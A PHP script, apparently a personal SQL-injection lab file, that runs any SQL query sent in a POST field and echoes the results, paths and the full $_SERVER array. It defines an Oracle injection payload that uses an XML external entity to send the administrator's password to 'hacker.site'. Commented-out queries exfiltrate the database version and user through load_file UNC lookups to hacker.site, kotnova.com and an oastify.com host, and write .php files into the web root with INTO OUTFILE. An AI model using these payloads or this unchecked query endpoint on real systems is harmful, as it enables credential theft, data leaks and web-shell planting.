<?php
if($_SERVER['SERVER_NAME'] == 'localhost'){
    $_GET['online'] = '';
}else{
    $_GET['local'] = '';
}

include './includes/conn.php';

include './includes/core2.php';
$d = "a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=";
$d .= '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://';
$d .= "'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/";
$d .= '"> %remote;]>';
$d .= "'),'/l') FROM dual-- -";

if (isset($_POST['sql'])) {
    $me = $_POST['sql'];
} else {
    $me = str_replace('lab4.php', 'lab4.php', $_SERVER['SCRIPT_FILENAME']);
}

$dt = '{ "a": 1, "b": [2, 3]}';
//https://master.kotnova.com/lab4.php?local=1&sql=/usr/local/bin/home/php/tsavosit/kever/data.txt
//$stmt = $conn->prepare("(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))");
//$stmt = $conn->prepare("SELECT load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));");
///$stmt = $conn->prepare("SELECT concat('\\\\',version(),'.hacker.site\\a.txt')");
//$stmt = $conn->prepare("SELECT JSON_INSERT('".$dt."','C:/xampp/htdocs/kever/sql.json')");
//$stmt = $conn->prepare("SELECT JSON_PRETTY('".$dt."') INTO OUTFILE 'C:/xampp/htdocs/kever/veryhappy.php'");
//$stmt = $conn->prepare("SELECT JSON_PRETTY('".$dt."') INTO OUTFILE 'C:/xampp/htdocs/kever/veryhappy.php'");
//$stmt = $conn->prepare("SELECT @@datadir");
##$stmt = $conn->prepare("SELECT load_file('" . $me . "') as Result");
//$stmt = $conn->prepare("SHOW VARIABLES LIKE 'secure_file_priv'");
//$stmt = $conn->prepare("show variables like '%max_allowed_packet%'");
// INTO OUTFILE 'C:/xampp/htdocs/kever/amhome.php'
//$stmt = $conn->prepare("SELECT load_file(CONCAT('\\\\',(SELECT @@version),'|',(SELECT system_user()),'|', (SELECT database()),'.',kotnova.com/cpanelwebcall/jfexdekbworxssxlbumnqugbklixpdnj'))");
//$stmt = $conn->prepare("SELECT CONCAT('\\\\', LOAD_FILE(VERSION(), 'kotnova.com'))");
//$stmt = $conn->prepare("SELECT LOAD_FILE(concat('\\\\',(SELECT system_user()), '.jzmwms8rwzqp5nuhs18xbxrgv71xpm.oastify.com'))");
$stmt = $conn->prepare($me);
//$stmt = $conn->prepare("SELECT CONCAT((SELECT @@version),'||',(SELECT system_user()),'||', (SELECT database()),'||', (SELECT schema()))");
//$stmt = $conn->prepare($d);
$stmt->execute();
$dt1 = $stmt->fetchAll();

if (is_array($dt1)) {
    foreach ($dt1 as $row) {
        // echo $row[0];
    }
    echo json_encode($dt1);
} else {
    echo $dt1;
}
echo '<br/><br/><br/>';
echo $me . '<br/><br/><br/>';
$path = getcwd();
echo "Your Absoluthe Path is: "; echo $path. '<br/><br/><br/>';
echo print_r($_SERVER);
